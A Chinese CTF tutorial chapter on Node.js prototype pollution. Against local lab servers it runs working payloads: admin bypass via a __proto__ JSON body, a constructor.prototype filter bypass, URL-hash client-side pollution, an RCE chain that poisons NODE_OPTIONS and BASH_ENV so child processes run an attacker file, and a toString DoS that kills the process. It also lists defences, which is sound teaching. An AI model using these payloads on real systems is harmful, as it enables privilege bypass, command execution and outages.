---
chapter: Web安全
section: 原型污染与 Node.js
order: 614
tags:
  - CTF
  - Web安全
  - 原型污染
  - Node.js
publish: true
---

# W14 原型污染与 Node.js
## Prototype Pollution & Node.js

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L3 进阶期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W08-XSS|W08]] · [[W09-SSTI|W09]]
> **本章目标**：装好并会用 Node 与 npm；把 JS 原型模型（属性查找链、`__proto__` 与 `prototype` 的分工、继承怎么发生）讲到零基础能跟上；在自建靶上走完原型污染的完整链条——污染怎么发生、权限判断怎么失效、`constructor.prototype` 变体怎么绕过过滤、客户端 hash 入口怎么打；评估三类危害（权限绕过、污染进子进程的 RCE 路线、污染 `toString` 的 DoS）；在当前 Node 版本上拆解 vm"沙箱"的经典逃逸；最后落到过滤、无原型字典、结构校验与进程级隔离的防御组合。

[[11-Web安全版图与Burp#4.3 JS 原型链污染一瞥|11 章 4.3]] 用十几行代码给出过一个结论：递归 merge 不检查 `__proto__` 这个键，提交 `{"__proto__": {"admin": true}}`，所有对象的 `admin` 从此都是 true——"第一眼认出递归 merge"是那一节的落点。本章把这个结论展开成完整的攻防路径：先补齐 JS 原型模型这块地基，对没写过 JS 的读者它是新知识，也是理解后面每一行的前提；再在自建靶上依次走污染发生、变体绕过、客户端同构、危害升级与防御。

与相邻章节的分工：[[W12-PHP反序列化#3. POP 链：从读源码到命令执行|W12 第 3 节]]讲过"不注入代码，只控制属性，让程序自己的逻辑把属性变成行为"的链式思想，本章的危害构造与它同构；[[W09-SSTI#6. 沙箱逃逸入门|W09 第 6 节]]"沙箱不是修法"的结论会在 vm 一节再次成立；[[W08-XSS#5. DOM 型 XSS：sink 在前端源码里|W08 第 5 节]]的 source/sink 术语在客户端一节直接复用。原型污染造成的权限绕过，与下一章要讲的逻辑与认证漏洞相邻而有别：前者改的是"程序做判断时读到的值"，后者改的是"判断流程本身"。

> [!note] 本章的实验约定
> 运行时按 Node v22.22.1、npm 9.2.0、qs 6.16.1 的行为记录（第 1 节给安装命令）。原型污染的可利用面与沙箱行为对版本敏感，==版本差异处在正文单独标出==，这是本章与前面各章最大的不同。三个自建靶全部监听 `127.0.0.1`：权限靶 9401、DoS 靶 9402、客户端静态页 9403（[[W02-工具链实战与靶场搭建|W02]] 的自建靶方法沿用）。curl 一律带 `--noproxy '*'`（防止系统代理往响应里塞内容，[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），URL 单引号包住。所有示例代码先存成 `.js` 文件再 `node` 运行，不在命令行内联——原因见 [[#8. 常见问题|第 8 节]]。

## 1. Node 环境：安装、运行与 npm

### 1.1 安装

Node.js 是 JS 的服务端运行时，Web 方向的 Node 题（服务端与前端）都在它上面跑。Linux 下一条命令装齐 Node 与包管理器 npm：

```bash
sudo apt-get install -y nodejs npm
node --version
npm --version
```

输出（安装过程的下载与解包行省略，只保留两条版本信息）：

```
v22.22.1
9.2.0
```

### 1.2 运行脚本、REPL 与单行求值

三种运行方式：`node 脚本.js` 运行脚本文件（本章示例的主要形态）；`node` 进入 REPL，逐行输入、逐行出结果，Ctrl+D 退出；`node -e '代码'` 单行求值，适合一行以内的快速确认：

```bash
node -e 'console.log(1 + 1)'
```

输出：

```
2
```

REPL（read–eval–print loop，交互式解释器）是学习 JS 对象模型最顺手的工具：提示符是 `>`，每输入一行表达式立刻打印结果。第 2 节的演示都以完整 REPL 会话的形式给出。

### 1.3 npm 与第三方依赖

npm 装第三方依赖。本章会用到 qs（一个 query 解析库，4.1 节分析它的入口形态），借此把"依赖怎么进项目"走一遍：

```bash
mkdir -p /tmp/w14lab && cd /tmp/w14lab
npm init -y
```

输出：

```
Wrote to /tmp/w14lab/package.json:

{
  "name": "w14lab",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
}
```

```bash
npm install qs --registry=https://registry.npmmirror.com
```

输出：

```
added 19 packages in 2s

11 packages are looking for funding
  run `npm fund` for details
```

`npm init -y` 生成 package.json（项目清单），`npm install 包名` 把依赖装进 `node_modules/`。默认源连接慢或超时时，`--registry=https://registry.npmmirror.com` 临时换国内镜像；要长期生效用 `npm config set registry https://registry.npmmirror.com`。临时目录重启后会清空，要留存的实验把目录放到家目录下。

## 2. JS 原型模型最小基础

### 2.1 对象与属性查找链

JS 对象是"属性名 → 值"的集合，外加一条隐藏链接。读取 `obj.key` 时引擎按固定顺序找：先在 `obj` 自己的属性里找；找不到，顺着隐藏链接到下一个对象找；一路走到链条终点还没有，返回 `undefined`。进 REPL 走一遍：

```bash
node
```

输出：

```
Welcome to Node.js v22.22.1.
Type ".help" for more information.
> const user = { name: "alice" }
undefined
> user.name
'alice'
> user.id
undefined
> user.toString
[Function: toString]
> typeof user.toString
'function'
> user.__proto__ === Object.prototype
true
> Object.prototype.__proto__
null
```

逐行读：

- `user.name` 是自有属性，第一层命中；
- `user.id` 哪一层都没有，返回 `undefined`；
- `user.toString` 从没写过，却能读到值——==它是从查找链的下一站拿到的==。每个字面量对象默认链到 `Object.prototype`，`toString` 这类"人人都有"的方法就挂在那里；
- `user.__proto__ === Object.prototype` 为 `true`：字面量对象的隐藏链接默认指向 `Object.prototype`；
- `Object.prototype.__proto__` 是 `null`：==`Object.prototype` 是默认查找链的终点==。

> [!info]- `__proto__` 不是普通属性，是访问器
> `__proto__` 在对象上其实并不"存在"——它是 `Object.prototype` 上定义的一对 getter/setter。读 `obj.__proto__` 触发 getter，返回对象的原型；写 `obj.__proto__ = x` 触发 setter，把 obj 的原型换成 x。这对区分很重要：有些操作（3.2 节的 `JSON.parse`）会绕过 getter/setter，创建一个名字恰好叫 `__proto__` 的普通自有属性——名字一样，机制完全两样。

### 2.2 __proto__ 与 prototype 的分工

两个词只差一个下划线，分工完全不同：

| | 属于谁 | 含义 |
| ---- | ---- | ---- |
| `__proto__` | 每个对象 | 这个对象找不到属性时，去哪个对象找（查找链的下一站） |
| `prototype` | 函数 | 这个函数被 `new` 当构造器用时，造出的实例的 `__proto__` 指到哪 |

同一个 REPL 会话继续：

```
> function Admin() {}
undefined
> Admin.prototype
{}
> const a = new Admin()
undefined
> a.__proto__ === Admin.prototype
true
> a.__proto__.__proto__ === Object.prototype
true
> const dict = Object.create(null)
undefined
> dict.toString
undefined
```

- `Admin.prototype` 是一个对象（REPL 显示 `{}`），函数一声明就自带；
- `new Admin()` 造出的实例 `a`，其 `__proto__` 恰是 `Admin.prototype`——==继承发生在 `new` 的这一刻，做的事就是把两者的链接起来==；
- 于是 `a` 的查找链是 `a → Admin.prototype → Object.prototype → null`，两层；
- `Object.create(null)` 造"无原型对象"：隐藏链接直接是 `null`，查找链只剩自己一层，`dict.toString` 返回 `undefined`——7.2 节会把它用作防御手段。

> [!note] 函数自己也是对象
> 函数有 `prototype`，同时也有自己的 `__proto__`（链到 `Function.prototype`）。`obj.constructor` 能读到函数 `Object`，是因为 `Object.prototype` 上挂着 `constructor` 属性——3.1 与 4.2 节的 `constructor.prototype` 写法走的就是这条链。

### 2.3 为什么 Web 手要关心这条链

==查找链是共享的：改链上任何一个对象，挂在它下面的所有对象同时受影响==，而 `Object.prototype` 挂着全部字面量对象。若攻击者能让程序往 `Object.prototype` 上写进一个属性，程序后续任何一次"读取某属性而对象上没有"的代码，读到的都是攻击者写的值。这就是原型污染（prototype pollution）。它与 [[W12-PHP反序列化#3. POP 链：从读源码到命令执行|W12 第 3 节]]的 POP 链思想同构：==不注入代码，控制属性，让程序自己的逻辑把属性变成行为==。

## 3. 原型污染：赋值怎么写到共享原型上

### 3.1 两种写法，同一个原型

11 章 4.3 指出递归 merge 不查 `__proto__`。先把"赋值怎么改到共享原型"单独看清楚。下面这个脚本各用一种写法写一个属性：

```js
// proto_write.js —— 两种 key 写法改的都是同一个共享原型
// 用法: node proto_write.js 1   或   node proto_write.js 2
const mode = process.argv[2];

if (mode === "1") {
  const obj = {};
  obj.__proto__.x = 1;
  console.log("obj.__proto__.x = 1 之后, ({}).x =", ({}).x);
} else {
  const obj = {};
  obj.constructor.prototype.y = 2;
  console.log("obj.constructor.prototype.y = 2 之后, ({}).y =", ({}).y);
}
console.log("新造一个对象再读:", ({}).x, ({}).y);
```

```bash
node proto_write.js 1
```

输出：

```
obj.__proto__.x = 1 之后, ({}).x = 1
新造一个对象再读: 1 undefined
```

```bash
node proto_write.js 2
```

输出：

```
obj.constructor.prototype.y = 2 之后, ({}).y = 2
新造一个对象再读: undefined 2
```

两条路径的传导：

- `obj.__proto__.x = 1`：先读 `obj.__proto__`（getter 返回 `Object.prototype`），再把 `x` 写上去——写的是共享原型，所以新造的 `{}` 也读得到 `x`；
- `obj.constructor.prototype.y = 2`：`obj` 自己没有 `constructor`，沿查找链在 `Object.prototype` 上找到它（指向 `Object` 函数，见 2.2 的 note），`Object` 函数的 `prototype` 恰是 `Object.prototype`——同样落到共享原型。

==两种写法是同一个目标的两条路，过滤掉一条，另一条还在==。这个等价性在 4.2 节变成具体的绕过手段。

### 3.2 递归 merge 靶：JSON body 进，权限判断出

把 11 章 4.3 的 merge 接上 HTTP。靶子：`POST /login` 的 JSON body 经递归 merge 合入服务端配置，随后做权限判断：

```js
// merge_server.js —— 原型污染靶：POST /login 的 JSON body 经递归 merge 合入配置，再做权限判断
const http = require('http');

const config = { site: 'ctf-lab', debug: false };

function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

function isAdmin(name) {
  const profile = { name: name };   // 普通用户的资料里没有 admin 字段
  return profile.admin === true;    // 未污染时 undefined === true，返回 false
}

http.createServer((req, res) => {
  if (req.method !== 'POST' || req.url !== '/login') {
    res.writeHead(404); res.end(); return;
  }
  let body = '';
  req.on('data', c => body += c);
  req.on('end', () => {
    let data;
    try { data = JSON.parse(body); } catch { res.writeHead(400); res.end('bad json\n'); return; }
    merge(config, data);
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end(`user=${data.user} admin=${isAdmin(data.user)} debug=${config.debug}\n`);
  });
}).listen(9401, '127.0.0.1', () => console.log('listening on 127.0.0.1:9401'));
```

```bash
node merge_server.js
```

输出：

```
listening on 127.0.0.1:9401
```

打靶四连：正常请求、污染请求、污染之后的两个普通用户：

```bash
curl -s --noproxy '*' -d '{"user":"bob","level":3}' http://127.0.0.1:9401/login
curl -s --noproxy '*' -d '{"__proto__":{"admin":true}}' http://127.0.0.1:9401/login
curl -s --noproxy '*' -d '{"user":"carol"}' http://127.0.0.1:9401/login
curl -s --noproxy '*' -d '{"user":"dave"}' http://127.0.0.1:9401/login
```

输出：

```
user=bob admin=false debug=false
user=undefined admin=true debug=false
user=carol admin=true debug=false
user=dave admin=true debug=false
```

第二条之后 `isAdmin` 的判断永久变质：carol、dave 与之后的所有用户全部 `admin=true`。传导路径逐行拆：

1. `JSON.parse` 把 body 变成对象 `data`，`data` 上有一个自有键 `__proto__`，值是 `{admin: true}`（机制见下方 warning）；
2. merge 的循环取到 `key = "__proto__"`，`typeof source[key]` 是 `'object'`，走进递归分支；
3. 递归前读 `target[key]`，即 `config.__proto__`——getter 返回 `Object.prototype`；
4. `merge(Object.prototype, {admin: true})` 执行赋值，`Object.prototype.admin = true`；
5. `isAdmin` 里 `profile.admin` 沿查找链读到 `Object.prototype` 上的 `true`。

==merge 的赋值语句把 `__proto__` 当普通键执行，污染就发生在这一行==。

> [!warning] JSON.parse 不触发 __proto__ 的 setter
> 常见误区："__proto__ 写在 JSON 里，parse 时就改原型了"。不是。`JSON.parse` 走的是另一条定义属性的路径，得到的 `__proto__` 是一个名字特殊的普通自有属性，不碰原型。脚本对照：

```js
// json_proto.js —— JSON.parse 与普通赋值对 "__proto__" 键的不同处理
const o = JSON.parse('{"__proto__": {"x": 1}}');
console.log("1) JSON.parse 结果的自有键:", Object.keys(o));
console.log("2) o 的原型仍是 Object.prototype:", Object.getPrototypeOf(o) === Object.prototype);

const p = {};
p["__proto__"] = { x: 1 };
console.log("3) 执行 p['__proto__'] = {x:1} 之后:");
console.log("   p 的原型被换成了新对象:", Object.getPrototypeOf(p) !== Object.prototype);
console.log("4) ({}).x =", ({}).x);
```

```bash
node json_proto.js
```

输出：

```
1) JSON.parse 结果的自有键: [ '__proto__' ]
2) o 的原型仍是 Object.prototype: true
3) 执行 p['__proto__'] = {x:1} 之后:
   p 的原型被换成了新对象: true
4) ({}).x = undefined
```

==parse 只是把键放好，污染发生在 merge 拿着这个键去赋值的那一刻==。这也解释了漏洞责任为什么落在 merge 类函数上：JSON 本身无害，是"不设防的合并"把特殊键变成了原型操作。

> [!note] 污染随进程存活
> 写进 `Object.prototype` 的属性跟着 Node 进程活到最后：一个请求污染，之后所有请求、以及这个进程里的全部代码都读得到；只有重启进程才复原。排查"改了代码行为却没变"的问题时，先重启再复测，避免上一轮的污染叠在新代码上。

## 4. 入口与变体

### 4.1 入口盘点：JSON、query 方括号与表单

污染要成立需要两样东西：一个"能把攻击者的键送进赋值语句"的入口，加一个"不设防就赋值"的合并点。3.2 节的入口是 JSON body；另外两个高频入口来自同一个机制：==很多解析库把 `a[b]=c` 这类方括号写法展开成嵌套对象==，方括号里写什么键，解析器就造什么键。

Node 生态里做这件事最常用的是 qs 库（Express 的 extended 表单解析、大量框架的 query 解析都在用它）。1.3 节装好的 qs 现在派上用场：

```js
// qs_test.js —— 当前版本 qs 的方括号展开与 __proto__ 处理
const qs = require('qs');
console.log('qs 版本:', require('qs/package.json').version);
console.log('1) 普通方括号展开:', JSON.stringify(qs.parse('user[name]=bob&user[level]=3')));
const out1 = qs.parse('__proto__[admin]=true');
console.log("2) qs.parse('__proto__[admin]=true') 的自有键:", Object.keys(out1));
console.log('3) ({}).admin =', ({}).admin);
const out2 = qs.parse('constructor[prototype][admin]=true');
console.log("4) constructor[prototype] 写法的结果:", JSON.stringify(out2));
console.log('5) ({}).admin =', ({}).admin);
```

```bash
node qs_test.js
```

输出：

```
qs 版本: 6.16.1
1) 普通方括号展开: {"user":{"name":"bob","level":"3"}}
2) qs.parse('__proto__[admin]=true') 的自有键: []
3) ({}).admin = undefined
4) constructor[prototype] 写法的结果: {}
5) ({}).admin = undefined
```

当代版本把两类危险键直接丢弃：展开机制还在（第 1 行，`user[name]` 变成了嵌套对象），污染路径没了（第 2、4 行返回空）。方括号入口在老版本解析库里真实存在过——遇到老依赖（项目锁死的旧 qs、旧 Express）时，查询串 `?__proto__[admin]=true` 与表单字段 `__proto__[admin]=true` 都是现成载荷。==判断这个入口是否可用，先确认依赖版本==。

> [!note] 目标的依赖版本从哪看
> 源码或 `.git` 泄露后读 package.json 与 package-lock.json（[[W03-信息泄露与前端安全|W03]] 的泄露面）；拿不到源码时，报错页、框架指纹与公开仓库的同版本代码都能给出线索。

### 4.2 绕过只挡 __proto__ 的过滤

防御者的第一反应是过滤 `__proto__` 这个键。3.1 节已铺垫第二条路，现在看只挡一种写法的 merge 能不能守住：

```js
// filter_check.js —— 只过滤 "__proto__" 的 merge，constructor.prototype 载荷仍能打进来
// 用法: node filter_check.js <payload.json>
const fs = require('fs');
const raw = fs.readFileSync(process.argv[2], 'utf8');
const payload = JSON.parse(raw);

function merge(target, source) {
  for (const key in source) {
    if (key === '__proto__') continue;          // 开发者只想到了这一种写法
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

merge({}, payload);
console.log("载荷:", raw.trim());
console.log("新对象上读 admin:", ({}).admin);
```

载荷文件 p_ctor.json：

```json
{"constructor": {"prototype": {"admin": true}}}
```

```bash
node filter_check.js p_ctor.json
```

输出：

```
载荷: {"constructor": {"prototype": {"admin": true}}}
新对象上读 admin: true
```

过滤被完整绕过。传导路径：merge 读到键 `constructor`（不在过滤名单里），递归时 `target["constructor"]` 沿查找链拿到 `Object` 函数；下一层的键 `prototype` 恰是 `Object.prototype`；第三层把 `admin` 写上去。==过滤名单必须同时盖住 `__proto__`、`constructor`、`prototype` 三个键，少一个就有第二条路==——7.1 节的防御版给出完整名单。

### 4.3 客户端原型污染：URL hash → merge

同一套机制搬到浏览器就是客户端原型污染。前端常从 URL 读参数初始化配置，`#` 后面的部分（[[W08-XSS#5. DOM 型 XSS：sink 在前端源码里|W08 第 5 节]]讲过：浏览器发请求时不带 fragment，服务器全程看不见）经解析、merge 进配置对象。靶子是一面纯静态页：

```html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>用户设置</title></head>
<body>
<h1>用户设置</h1>
<p>主题:<span id="theme"></span></p>
<div id="beta"></div>
<script>
  // source：location.hash；sink：方括号展开 + 递归 merge
  function parseQuery(q) {
    const out = {};
    for (const part of q.split('&')) {
      const eq = part.indexOf('=');
      if (eq < 0) continue;
      const path = part.slice(0, eq).split('[').map(s => s.replace(']', ''));
      const val = decodeURIComponent(part.slice(eq + 1));
      let node = out;
      for (let i = 0; i < path.length - 1; i++) {
        if (typeof node[path[i]] !== 'object' || node[path[i]] === null) node[path[i]] = {};
        node = node[path[i]];
      }
      node[path[path.length - 1]] = val;
    }
    return out;
  }

  function merge(target, source) {
    for (const key in source) {
      if (typeof source[key] === 'object' && source[key] !== null) {
        if (!target[key]) target[key] = {};
        merge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
    return target;
  }

  const config = { theme: 'light' };
  merge(config, parseQuery(decodeURIComponent(location.hash.slice(1))));

  document.getElementById('theme').textContent = config.theme;
  document.getElementById('beta').textContent = config.beta
    ? 'Beta 面板已开启: ' + config.beta
    : 'Beta 面板未开启（当前版本没有这个功能）';
</script>
</body>
</html>
```

在 `client.html` 所在目录起静态服务（9403 端口）：

```bash
python3 -m http.server 9403 --bind 127.0.0.1
```

输出：

```
127.0.0.1 - - [23/Oct/2026 23:42:00] "GET /client.html HTTP/1.1" 200 -
```

打靶操作路径：

1. 浏览器打开 `http://127.0.0.1:9403/client.html`，页面显示"Beta 面板未开启（当前版本没有这个功能）"；
2. 地址栏换成 `http://127.0.0.1:9403/client.html#__proto__%5Bbeta%5D=1`（`%5B`、`%5D` 是方括号的 URL 编码），整页刷新一次；
3. 页面变为"Beta 面板已开启: 1"；
4. DevTools 的 Console 面板输入 `({}).beta` 回车，得到 `"1"`。

| 操作 | 页面显示 / Console 结果 |
| ---- | ---- |
| 打开不带载荷的地址 | Beta 面板未开启（当前版本没有这个功能） |
| 打开带载荷的地址并整页刷新 | Beta 面板已开启: 1 |
| 上一步之后在 Console 执行 `({}).beta` | `"1"` |

==任意一个新建的空对象都带上了 `beta` 属性——污染在浏览器里成立==。`parseQuery` 里 `node[path[i]]` 那一行读到的 `__proto__` 是 `Object.prototype`（它本来就是对象，不必新建），方括号逐层走下去，最后一行赋值把属性写到了共享原型上：与服务端靶逐行对应，只是入口从请求体换成了 hash。

> [!warning] 锚点跳转不会重跑脚本
> 在已打开的 `client.html` 上直接往地址栏追加 `#...` 回车，浏览器做的是同文档锚点跳转：页面不重新加载，JS 不重新执行，污染不会发生。必须整页刷新，或者新开标签页直接打开带载荷的完整地址，让脚本带着 hash 重新跑一遍。

> [!note] 客户端污染的危害要看 gadget
> 这个靶子里污染只是把一个展示开关打开。真实前端里，被污染的键会流进更多读取点：配置合并、功能门控、甚至请求参数组装。==客户端污染自己很少是终点，通常还要在页面引用的 JS 库里找到一个"读了被污染的键去做危险操作"的 gadget==。分析方法与 [[W08-XSS#5. DOM 型 XSS：sink 在前端源码里|W08 第 5 节]]同源：这里的 source 是 `location.hash`，sink 从 `innerHTML` 换成了"不设防的 merge 加一切缺省属性读取"。PortSwigger 的免费实验室（第 9 节）提供带真实 gadget 的完整靶。

## 5. 危害面：从权限绕过到 RCE 与 DoS

### 5.1 权限绕过

3.2 节已经给出完整形态：判断逻辑读一个"通常不存在"的属性，污染让缺省值变成攻击者的值。==判断逻辑读什么，污染什么，判断就倒向哪边==——`admin` 之外，`isVip`、`verified`、`role` 同理。这类绕过与下一章的逻辑与认证漏洞相邻：不需要密码、不需要越权接口，一个请求改掉整个进程的判断基准。

### 5.2 污染进子进程：NODE_OPTIONS 与 BASH_ENV

Node 程序起子进程用 `child_process` 的 spawn 族。污染影响它们的路径有一条确定的通道：==spawn 组装子进程环境变量用的是 `for...in` 遍历，而 `for...in` 会把继承属性一并遍历==。也就是说，`Object.prototype` 上被污染的环境变量，会进到之后每一个子进程的环境里。

环境变量里有一类特殊的：node 进程启动时先解析 `NODE_OPTIONS`，把里面的内容当自己的启动参数，`--require=<文件>` 会让它在跑任何业务代码之前先加载这个文件。两件事接起来：污染 `NODE_OPTIONS` 指向攻击者的 JS 文件，之后任何 node 子进程一启动就执行攻击者的代码。

先确认通道两端。诊断脚本检查"spawn 的选项读取认不认继承属性"，攻击文件 pwn.js 先就位：

```js
// pwn.js —— 攻击者事先落在服务器上的 JS 文件（上传、日志写入都能造成这个事实）
console.log('[pwned] ' + require('child_process').execSync('id').toString().trim());
```

```js
// diag_spawn.js —— 诊断：Node 22 的 spawnSync 读取继承属性吗
const { spawnSync } = require('child_process');

Object.prototype.shell = 'node';
Object.prototype.NODE_OPTIONS = '--require=/tmp/w14lab/pwn.js';

const o = {};
console.log('1) 继承读取本身成立吗: o.shell =', o.shell, '| o.NODE_OPTIONS =', o.NODE_OPTIONS);

// A: 只靠继承的 shell
const r1 = spawnSync('echo', ['hi'], {});
console.log('2) spawnSync("echo",["hi"],{}) →', JSON.stringify((r1.stdout || '').toString()),
            'status', r1.status, 'err', (r1.error || {}).message);

// B: 子进程本身是 node，看继承的 NODE_OPTIONS 会不会被带进子进程环境
const r2 = spawnSync(process.execPath, ['-e', 'console.log("child ok")'], {});
console.log('3) spawnSync(node -e ...) →', JSON.stringify((r2.stdout || '').toString()),
            'status', r2.status);

// C: 显式把 shell 放到自有属性上
const r3 = spawnSync('echo', ['hi'], { shell: 'node' });
console.log('4) 自有 shell:node →', JSON.stringify((r3.stdout || '').toString()), 'status', r3.status);
```

```bash
node diag_spawn.js
```

输出：

```
1) 继承读取本身成立吗: o.shell = node | o.NODE_OPTIONS = --require=/tmp/w14lab/pwn.js
2) spawnSync("echo",["hi"],{}) → "hi\n" status 0 err undefined
3) spawnSync(node -e ...) → "[pwned] uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)\nchild ok\n" status 0
4) 自有 shell:node → "[pwned] uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)\n" status 1
```

四行读数，两个版本行为：

- 第 1 行：JS 层面的继承读取成立，污染"看得见"；
- 第 2 行：==Node 22 的 spawnSync 不吃继承来的 `shell` 选项==——输出仍是真 `echo` 打的 `hi`。老资料里"污染 `Object.prototype.shell` 让任意 spawn 走攻击者的 shell"的打法，在当代 Node 已经被堵上：spawn 的选项读取只认自有属性；
- 第 3 行：==环境变量的通道还在==——子进程是 node，启动即执行了 pwn.js（`[pwned]` 行），随后才跑自己的代码（`child ok` 行）；
- 第 4 行：`shell` 以自有属性形式给出时照常生效（命令被交给 node 处理，退出码 1）——对照组，说明第 2 行的失效是"继承"被拒，不是选项机制坏了。

通道确认后，完整链的靶子是一个任务调度器：先 merge 进配置，再起 node 子进程执行正常任务 worker.js：

```js
// rce_target.js —— 污染进子进程环境：spawn 组装环境变量用的是 for...in，继承属性一并带走
// 用法: node rce_target.js            （干净对照）
//       node rce_target.js rce.json   （先 merge 进载荷再 spawn）
const { spawnSync } = require('child_process');
const fs = require('fs');

function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const opts = {};          // 任务调度器的默认选项对象
if (process.argv[2]) {
  merge(opts, JSON.parse(fs.readFileSync(process.argv[2], 'utf8')));
}

console.log('调度器启动子进程 worker.js ...');
const r = spawnSync(process.execPath, ['worker.js'], opts);
console.log('子进程 status:', r.status);
process.stdout.write((r.stdout || '').toString());
if (r.stderr) process.stdout.write(r.stderr);
```

```js
// worker.js —— 被调度的正常任务脚本
console.log('worker ok');
```

载荷文件 rce.json（路径换成自己环境里 pwn.js 的绝对路径）：

```json
{"__proto__": {"NODE_OPTIONS": "--require=/tmp/w14lab/pwn.js"}}
```

```bash
node rce_target.js
```

输出：

```
调度器启动子进程 worker.js ...
子进程 status: 0
worker ok
```

```bash
node rce_target.js rce.json
```

输出：

```
调度器启动子进程 worker.js ...
子进程 status: 0
[pwned] uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
worker ok
```

`[pwned]` 行是 pwn.js 打出来的：==merge 走 3.2 节的同一条路把 `NODE_OPTIONS` 写上 `Object.prototype`，spawn 的 `for...in` 把它带进子进程环境，node 子进程一启动就先执行了攻击者的文件==，随后才继续跑正常任务。pwn.js 里是 `execSync('id')`，换成任意命令就是任意命令执行（执行函数族见 [[W05-命令注入与代码执行|W05]]）。

同一条 env 通道对 bash 子进程同样有效：非交互 bash 启动时会先 source `BASH_ENV` 指向的文件。

```js
// rce_bash.js —— 同一条 env 路线打 bash 子进程：BASH_ENV 会被非交互 bash 先 source
const { spawnSync } = require('child_process');
Object.prototype.BASH_ENV = '/tmp/w14lab/pwn.sh';
const r = spawnSync('bash', ['worker.sh'], {});
console.log('status:', r.status);
process.stdout.write((r.stdout || '').toString());
```

```bash
# pwn.sh —— 攻击者落在服务器上的 shell 脚本
echo "[pwned-bash] uid=$(id -u)"
```

```bash
# worker.sh —— 被调度的正常 bash 任务
echo "bash worker ok"
```

```bash
node rce_bash.js
```

输出：

```
status: 0
[pwned-bash] uid=1000
bash worker ok
```

> [!warning] RCE 链的四个条件
> 这条链成立要同时满足：① 有污染点（3.2 节的 merge 类函数）；② 程序会 spawn 子进程，且选项对象是普通对象；③ 子进程认被污染的环境变量（node 认 `NODE_OPTIONS`，bash 认 `BASH_ENV`）；④ 攻击者能让一个文件落在目标机器上且路径可知——上传、日志写入、缓存目录都能做到。四个条件缺一不可；这也是它在真实环境比权限绕过少见的原因，但在任务调度、构建系统、测试框架类目标里每一条都不罕见。

### 5.3 拒绝服务：污染 toString

对象拼进字符串时，JS 调用它的 `toString` 方法；这个方法同样挂在 `Object.prototype` 上。把它污染成一个非函数值，==此后进程里任何一处"对象拼字符串"都会抛 TypeError==：

```js
// dos_server.js —— DoS 靶：请求处理里有一处"对象拼进字符串"
const http = require('http');

const info = { app: 'demo' };

function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/settings') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      try { merge(info, JSON.parse(body)); } catch (e) { }
      res.end('saved\n');
    });
    return;
  }
  const greeting = 'welcome to ' + info;      // 每个请求都会执行的字符串拼接
  res.end(greeting + '\n');
}).listen(9402, '127.0.0.1', () => console.log('listening on 127.0.0.1:9402'));
```

```bash
node dos_server.js
```

输出：

```
listening on 127.0.0.1:9402
```

正常请求、污染请求、再次请求：

```bash
curl -s --noproxy '*' http://127.0.0.1:9402/
curl -s --noproxy '*' -d '{"__proto__":{"toString":"x"}}' http://127.0.0.1:9402/settings
curl --noproxy '*' http://127.0.0.1:9402/
```

输出：

```
welcome to [object Object]
saved
curl: (52) Empty reply from server
```

第一条是默认 `toString` 的输出（`[object Object]`）；污染之后的第三条请求没有得到任何响应——进程退出了。服务端日志里是那次异常的堆栈：

```
listening on 127.0.0.1:9402
/tmp/w14lab/dos_server.js:28
  const greeting = 'welcome to ' + info;      // 每个请求都会执行的字符串拼接
                                 ^

TypeError: Cannot convert object to primitive value
    at Server.<anonymous> (/tmp/w14lab/dos_server.js:28:34)
    at Server.emit (node:events:519:28)
    at parserOnIncoming (node:_http_server:1186:12)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:125:17)

Node.js v22.22.1
```

`toString` 被换成字符串 `"x"` 后不可调用，对象到字符串的转换无处可去，抛出 `TypeError`。拼接发生在请求处理函数的顶层，异常没人接，Node 对未捕获异常的默认处置是打印堆栈并退出进程——==一次污染，服务进程整体退出==。框架类服务（如 Express）默认按请求兜住异常，结果退化为"每个涉及拼接的请求都返回 500"，同样是拒绝服务。字符串拼接在真实服务里到处都是：日志、模板、响应组装，可污染的键也不止 `toString`，`valueOf` 与 `Symbol.toPrimitive` 同在这条转换链上。

## 6. vm 沙箱逃逸

### 6.1 vm 的隔离边界

vm 是 Node 内置模块，把一段代码放进一个"新上下文"执行：上下文有自己的全局对象，与宿主的全局相互分开，看起来像沙箱。先看边界两侧各有什么：

```js
// vm_basics.js —— vm 的"隔离"边界：新上下文里没有宿主的全局对象
const vm = require('vm');

const ctx = { x: 1 };
vm.createContext(ctx);
console.log('1) 上下文内可用传入的变量:', vm.runInNewContext('x + 1', ctx));
try {
  vm.runInNewContext('process', ctx);
} catch (e) {
  console.log('2) 上下文内访问 process:', e.constructor.name + ':', e.message);
}
console.log('3) 宿主一侧的 process 一直都在, node 版本:', process.versions.node);
```

```bash
node vm_basics.js
```

输出：

```
1) 上下文内可用传入的变量: 2
2) 上下文内访问 process: ReferenceError: process is not defined
3) 宿主一侧的 process 一直都在, node 版本: 22.22.1
```

